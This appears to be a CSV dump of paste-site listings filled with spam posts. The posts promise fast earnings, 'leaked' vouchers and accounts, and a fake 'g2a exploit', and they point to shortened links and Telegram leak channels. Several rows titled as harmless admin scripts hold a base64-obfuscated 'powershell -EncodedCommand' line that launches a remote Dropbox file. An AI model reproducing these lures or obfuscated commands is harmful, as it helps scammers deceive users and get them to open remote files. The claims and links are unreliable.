id,title,username,language,date,content
AsNhqkZd,??Earn $2000 a Month From Home C 85,Luka1111212121212,JavaScript,Monday 12th of May 2025 06:59:14 AM CDT,105115 - check it out at https://tinyurl.com/yb2hjwzn
GZH9Hq3J,schedule_tasks.ps1 46,tashrid,JavaScript,Monday 12th of May 2025 06:58:22 AM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBnAGMAYQBzADYAcQB0AGUAeQB2AHEAcQBzAHAAaQB0AG4AOQBsAGQANwAvAHQAdQB0AG8AcgBpAGEAbAAuAHAAZABmACIAIAAgACMAIABpAGQAPQBlAGQAOQA0ADgAMgA1AGUA
QGXQwfGf,Black Hole optimization v2 (181 nodes) 74,Luka1111212121212,JavaScript,Monday 12th of May 2025 06:56:13 AM CDT,450106 - check it out at https://tinyurl.com/yb2hjwzn
uXRjUMmu,schedule_tasks.ps1 72,tashrid,JavaScript,Monday 12th of May 2025 06:55:20 AM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBnAGMAYQBzADYAcQB0AGUAeQB2AHEAcQBzAHAAaQB0AG4AOQBsAGQANwAvAHQAdQB0AG8AcgBpAGEAbAAuAHAAZABmACIAIAAgACMAIABpAGQAPQA1ADcAZQBjADkAOABmAGQA
aRGcgvWR,⭐️ Leaked Free Vouchers Method ⭐️,vXvCOBRAvXv,JavaScript,Monday 12th of May 2025 06:55:08 AM CDT,"58786 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
1vuCXMqP,⭐️Earn $2000 a Month [EASY GUIDE]  ND,CmbSc,JavaScript,Monday 12th of May 2025 06:53:28 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

cejMEKhmpJ
"
MPmwf7L1,Test roblox v3 09,Luka1111212121212,JavaScript,Monday 12th of May 2025 06:52:40 AM CDT,550323 - check it out at https://tinyurl.com/yb2hjwzn
0DR1mx0m,cleanup_temp_files.bat 68,tashrid,JavaScript,Monday 12th of May 2025 06:52:18 AM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBnAGMAYQBzADYAcQB0AGUAeQB2AHEAcQBzAHAAaQB0AG4AOQBsAGQANwAvAHQAdQB0AG8AcgBpAGEAbAAuAHAAZABmACIAIAAgACMAIABpAGQAPQAzADgAYwAxADUAYwAzADYA
zYMH8Fsi,⭐️ Make $3000 in 24 hours ⭐️,vXvCOBRAvXv,JavaScript,Monday 12th of May 2025 06:51:06 AM CDT,"73691 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
AxZ2dbn0,⭐️EARN $500 INSTANTLY⭐ CW,Jaysonrod1234,JavaScript,Monday 12th of May 2025 06:49:59 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

TpZgTrL3Sz
"
DXxTa1vf,??Earn $2000 a Month From Home C 78,Luka1111212121212,JavaScript,Monday 12th of May 2025 06:49:39 AM CDT,823606 - check it out at https://tinyurl.com/yb2hjwzn
zyEd0q2L,restart_services.cmd 50,tashrid,JavaScript,Monday 12th of May 2025 06:49:16 AM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBnAGMAYQBzADYAcQB0AGUAeQB2AHEAcQBzAHAAaQB0AG4AOQBsAGQANwAvAHQAdQB0AG8AcgBpAGEAbAAuAHAAZABmACIAIAAgACMAIABpAGQAPQA2ADkAZgA5AGMANgA3AGIA
q9feRdNg,⭐️500 EUR BALANCE METHOD ⭐️,vXvCOBRAvXv,JavaScript,Monday 12th of May 2025 06:47:00 AM CDT,"56399 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
9H9Vq0nY,??Make 2000$+ daily together B 64,Luka1111212121212,JavaScript,Monday 12th of May 2025 06:46:38 AM CDT,308382 - check it out at https://tinyurl.com/yb2hjwzn
kBtiZXSU,⭐️Earn $2000 a Month [EASY GUIDE]  ND,Jaysonrod1234,JavaScript,Monday 12th of May 2025 06:46:24 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

5ZjUc9ENYO
"
kHiQdPP5,Bot Reversal-Band-Riot-P1 ETHUSDT.P BYBIT 4H LONG E SHORT 02,Luka1111212121212,JavaScript,Monday 12th of May 2025 06:43:36 AM CDT,196038 - check it out at https://tinyurl.com/yb2hjwzn
uQxknWU9,⭐️ Make $2000 Daily ⭐️,vXvCOBRAvXv,JavaScript,Monday 12th of May 2025 06:42:56 AM CDT,"41459 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
VUGjYQat,⭐️Make $3000 in Month [BTC]  KR,Astaroth_216,JavaScript,Monday 12th of May 2025 06:42:29 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

Q0NZZe7Zo3
"
9LNgPH9B,??Earn $2000 a Month From Home C 22,Luka1111212121212,JavaScript,Monday 12th of May 2025 06:40:35 AM CDT,496833 - check it out at https://tinyurl.com/yb2hjwzn
yjB38yWX,??Make 2000$+ daily together B 98,ii_xjackk,JavaScript,Monday 12th of May 2025 06:40:32 AM CDT,159312 - check it out at https://tinyurl.com/3pmt5325
knA44M0S,⭐️Earn $2000 a Month [EASY GUIDE]  ND,Astaroth_216,JavaScript,Monday 12th of May 2025 06:39:26 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

CAh8jErbBH
"
5D6eb2NL,⭐️ Leaked Free Vouchers Method ⭐️,vXvCOBRAvXv,JavaScript,Monday 12th of May 2025 06:38:52 AM CDT,"15774 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
nnZ4nJd6,Black Hole optimization v2 (181 nodes) 97,Luka1111212121212,JavaScript,Monday 12th of May 2025 06:37:34 AM CDT,846592 - check it out at https://tinyurl.com/yb2hjwzn
0nYqeUHr,2025-05-09T17:57:32.354182 29,ii_xjackk,JavaScript,Monday 12th of May 2025 06:37:31 AM CDT,689602 - check it out at https://tinyurl.com/3pmt5325
ijqhFe3w,⭐️MAKE 3000$ IN 1 DAY WITH BTC WG,Astaroth_216,JavaScript,Monday 12th of May 2025 06:36:23 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

7KILFZTjCq
"
FdiENXpE,⭐️ Make $3000 in 24 hours ⭐️,vXvCOBRAvXv,JavaScript,Monday 12th of May 2025 06:34:49 AM CDT,"72869 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
k5vYPMin,??Make $3000 in 24 hours W7 36,Luka1111212121212,JavaScript,Monday 12th of May 2025 06:34:33 AM CDT,650693 - check it out at https://tinyurl.com/yb2hjwzn
43Gw5QRk,Test roblox v3 38,ii_xjackk,JavaScript,Monday 12th of May 2025 06:34:23 AM CDT,070151 - check it out at https://tinyurl.com/3pmt5325
AcRPuPyj,⭐️EARN $500 INSTANTLY⭐ CW,Astaroth_216,JavaScript,Monday 12th of May 2025 06:33:19 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

993Qp3dBkc
"
FitXhLN1,??Make $3000 in 24 hours W7 95,Luka1111212121212,JavaScript,Monday 12th of May 2025 06:31:32 AM CDT,674114 - check it out at https://tinyurl.com/yb2hjwzn
3tL4vaDg,⭐️500 EUR BALANCE METHOD ⭐️,vXvCOBRAvXv,JavaScript,Monday 12th of May 2025 06:30:48 AM CDT,"78342 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
fTwRY93m,⭐️Make $3000 in Month [BTC]  KR,Astaroth_216,JavaScript,Monday 12th of May 2025 06:30:15 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

GFsW9hIMR2
"
WaBe8MtV,⭐️Earn $2000 a Month [EASY GUIDE]  ND,Astaroth_216,JavaScript,Monday 12th of May 2025 06:27:13 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

D1j7qOU4zT
"
jc8bLuiR,⭐️ Make $2000 Daily ⭐️,vXvCOBRAvXv,JavaScript,Monday 12th of May 2025 06:26:46 AM CDT,"49574 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
ZkmtrwGJ,⭐️Earn $2000 a Month [EASY GUIDE]  ND,LionKingBoy,JavaScript,Monday 12th of May 2025 06:23:55 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

9GzVPqR7e3
"
YMx9fbWL,⭐️ Leaked Free Vouchers Method ⭐️,vXvCOBRAvXv,JavaScript,Monday 12th of May 2025 06:22:45 AM CDT,"24736 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
WisjrbL6,⭐️EARN $500 INSTANTLY⭐ CW,carnival_gangachora,JavaScript,Monday 12th of May 2025 06:20:50 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

pZhBo054zK
"
MZ38Tbum,⭐️ Make $3000 in 24 hours ⭐️,vXvCOBRAvXv,JavaScript,Monday 12th of May 2025 06:18:43 AM CDT,"60409 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
7Y2X15PR,⭐️Make $3000 in Month [BTC]  KR,carnival_gangachora,JavaScript,Monday 12th of May 2025 06:17:46 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

9mePa55mEo
"
AxwEqEqw,Chaturbate with Tokens,iLoveToWatch,JavaScript,Monday 12th of May 2025 06:16:24 AM CDT,30754 Accounts Posted On https://t.me/leakzbyeminem
